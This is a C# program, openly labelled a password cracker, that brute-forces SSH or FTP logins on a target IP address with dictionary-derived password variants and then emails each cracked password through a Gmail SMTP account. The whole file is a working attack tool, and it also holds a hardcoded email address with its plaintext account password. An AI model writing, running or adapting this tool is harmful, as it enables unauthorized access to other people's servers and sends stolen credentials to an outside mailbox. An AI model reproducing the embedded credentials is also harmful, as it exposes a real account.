using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Threading.Tasks;
using Renci.SshNet;

class Program
{
    private static int totalAttempts;
    private static int successfulAttempts = 0;
    private static string emailAddress = "你的电子邮件"; // Your email address ni de dianzi youjian
    private static CancellationTokenSource cts = new CancellationTokenSource(); // Cancellation Token Source
    private static List<string> successfulPasswords = new List<string>(); // List to store successful passwords

    static async Task Main()
    {
        SendStartupEmail();

        Console.WriteLine("Enter the username:");
        string username = Console.ReadLine();

        Console.WriteLine("Enter the path to the dictionary file:");
        string dictionaryPath = Console.ReadLine();

        List<string> dictionary = LoadDictionary(dictionaryPath);

        Console.WriteLine("Enter the target IP address:");
        string ipAddress = Console.ReadLine();

        Console.WriteLine("Enter the target port (default SSH port is 22, FTP port is 21):");
        int port = int.TryParse(Console.ReadLine(), out int userPort)? userPort: 22;

        Console.WriteLine("Select protocol (1 for SSH, 2 for FTP):");
        int protocolChoice = int.TryParse(Console.ReadLine(), out int choice)? choice: 1;

        // Generate potential passwords
        var potentialPasswords = GeneratePotentialPasswords(dictionary);
        totalAttempts = potentialPasswords.Count;

        // Attempt to connect to the device with each password in the potential passwords
        List<Task> tasks = new List<Task>();
        foreach (var password in potentialPasswords)
        {
            if (successfulAttempts > 0) break; // Stop if a successful attempt is already found

            if (protocolChoice == 1)
            {
                tasks.Add(TryConnectSSH(ipAddress, port, username, password));
            }
            else if (protocolChoice == 2)
            {
                tasks.Add(TryConnectFTP(ipAddress, port, username, password));
            }
        }

        await Task.WhenAll(tasks);

        SendShutdownEmail();

        // Display successful matches
        Console.WriteLine($"Total Attempts: {totalAttempts}, Successful Attempts: {successfulAttempts}");
        Console.WriteLine("Successful Passwords:");
        foreach (var successfulPassword in successfulPasswords)
        {
            Console.WriteLine(successfulPassword);
        }
    }

    static List<string> LoadDictionary(string filePath)
    {
        if (!File.Exists(filePath))
        {
            Console.WriteLine("Dictionary file not found.");
            return new List<string>();
        }
        return File.ReadAllLines(filePath).ToList();
    }

    static List<string> GeneratePotentialPasswords(List<string> dictionary)
    {
        HashSet<string> potentialPasswords = new HashSet<string>();
        foreach (var word in dictionary)
        {
            potentialPasswords.Add(word);
            potentialPasswords.Add(word.ToUpper());
            potentialPasswords.Add(word.ToLower());
            potentialPasswords.Add(ReverseString(word));
            potentialPasswords.Add(AddSpecialCharacters(word));
            foreach (var secondWord in dictionary)
            {
                potentialPasswords.Add(word + secondWord);
                potentialPasswords.Add(word + "_" + secondWord);
                potentialPasswords.Add(secondWord + word);
            }
        }
        return potentialPasswords.ToList();
    }

    static string ReverseString(string str)
    {
        char[] charArray = str.ToCharArray();
        Array.Reverse(charArray);
        return new string(charArray);
    }

    static string AddSpecialCharacters(string word)
    {
        string[] specialChars = { "@", "#", "$", "%", "&", "!" };
        List<string> variations = new List<string>();
        foreach (var ch in specialChars)
        {
            variations.Add(word + ch);
            variations.Add(ch + word);
        }
        return string.Join(", ", variations);
    }

    static async Task TryConnectSSH(string ipAddress, int port, string username, string password)
    {
        try
        {
            using (var client = new SshClient(ipAddress, port, username, password))
            {
                await Task.Run(() => client.Connect());
                if (client.IsConnected)
                {
                    Console.WriteLine($"Connected to the SSH server with password: {password}");
                    Log($"Successful login: {username}@{ipAddress} with password: {password}");
                    Interlocked.Increment(ref successfulAttempts);
                    successfulPasswords.Add(password); // Store successful password
                    SendEmailNotification(username, ipAddress, password, "SSH");
                    cts.Cancel(); // Cancel other tasks
                }
                client.Disconnect();
            }
        }
        catch (Exception)
        {
            // Handle failed attempts
        }
        finally
        {
            Interlocked.Increment(ref totalAttempts);
            Console.WriteLine($"Attempts completed: {totalAttempts}");
        }
    }

    static async Task TryConnectFTP(string ipAddress, int port, string username, string password)
    {
        try
        {
            var request = (FtpWebRequest)WebRequest.Create($"ftp://{ipAddress}:{port}");
            request.Method = WebRequestMethods.Ftp.ListDirectory;
            request.Credentials = new NetworkCredential(username, password);

            using (var response = (FtpWebResponse)await request.GetResponseAsync())
            {
                if (response.StatusCode == FtpStatusCode.CommandOK) // Check for success
                {
                    Console.WriteLine($"Connected to the FTP server with password: {password}");
                    Log($"Successful login: {username}@{ipAddress} with password: {password}");
                    Interlocked.Increment(ref successfulAttempts);
                    successfulPasswords.Add(password); // Store successful password
                    SendEmailNotification(username, ipAddress, password, "FTP");
                    cts.Cancel(); // Cancel other tasks
                }
            }
        }
        catch (Exception)
        {
            // Handle failed attempts
        }
        finally
        {
            Interlocked.Increment(ref totalAttempts);
            Console.WriteLine($"Attempts completed: {totalAttempts}");
        }
    }

    static void SendEmailNotification(string username, string ipAddress, string password, string protocol)
    {
        try
        {
            var fromAddress = new MailAddress("marisapanashe02@gmail.com", "Password Cracker SZNN");
            var toAddress = new MailAddress(emailAddress);
            const string fromPassword = "270201panashe"; // Use a secure method to store passwords
            const string subject = "Successful Password Crack";
            string body = $"Successfully logged in as {username} to {ipAddress} with password: {password} using {protocol}.";

            using (var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            })
            {
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    smtp.Send(message);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to send email: {ex.Message}");
        }
    }

    static void SendStartupEmail()
    {
        SendEmail("Application Starting", "The password cracking application is now starting to run.");
    }

    static void SendShutdownEmail()
    {
        SendEmail("Application Stopped", "The password cracking application has finished running.");
    }

    static void SendEmail(string subject, string body)
    {
        try
        {
            var fromAddress = new MailAddress("marisapanashe02@gmail.com", "Password Cracker SZNN");
            var toAddress = new MailAddress(emailAddress);
            const string fromPassword = "270201panashe"; // Use a secure method to store passwords

            using (var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            })
            {
                using (var message = new MailMessage(fromAddress, toAddress)
                {
                    Subject = subject,
                    Body = body
                })
                {
                    smtp.Send(message);
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Failed to send email: {ex.Message}");
        }
    }

    static void Log(string message)
    {
        using (StreamWriter writer = new StreamWriter("log.txt", true))
        {
            writer.WriteLine($"{DateTime.Now}: {message}");
        }
    }
}
